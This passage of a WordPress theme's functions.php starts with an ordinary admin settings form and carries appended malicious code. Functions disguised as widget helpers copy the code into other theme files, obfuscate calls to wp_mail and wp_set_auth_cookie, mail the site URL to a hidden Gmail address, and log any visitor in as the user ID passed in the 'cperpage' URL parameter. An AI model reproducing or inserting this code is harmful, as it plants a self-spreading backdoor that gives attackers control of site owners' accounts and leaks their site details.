              <div class="value"><textarea name="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" <?php echo $value['css']; ?> ><?php if ( get_settings( $value['id'] ) != "") { echo stripslashes(get_settings( $value['id']) ); } else { echo $value['std']; } ?></textarea></div>
              <div class="explain"><?php echo $value['explain']; ?></div>
            </div>
        <!-- 选择框 -->
        <?php elseif($value['type'] == "select"): ?>
          <div class="setup">
            <h3><?php echo $value['name']; ?></h3>
            <div class="value">
              <select name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>"> 
              <?php $n=0;foreach ($value['options'] as $option): ?>
                <option value="<?php echo $option;?>" <?php if (get_settings( $value['id'] ) == $option) { echo 'selected="selected"'; } ?>>
                  <?php
                    if ((empty($option) || $option == '' ) && isset($value['option'])) {
                        echo $value['style'];
                      } else {
                        echo $value['style'][$n]; 
                      }
                  ?>
                </option>  
              <?php $n++; endforeach ?>
              </select>
            </div>
            <div class="explain"><?php echo $value['explain']; ?></div>
          </div>
        <?php endif ?>
      <?php endforeach ?>
    </div>
    <div class="submit">
      <input style="font-size:12px !important;" name="save" type="submit" value="保存设置" class="button-primary" />
      <input type="hidden" name="action" value="save" />
    </div>
  </form>
  
  <form method="post" class="reset">
      <input id="btn" name="reset" type="submit" value="恢复默认" />
      <input type="hidden" name="action" value="reset" />
  </form>
  
</div>
<?php
}
add_action('admin_menu', 'mytheme_add_admin');
?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>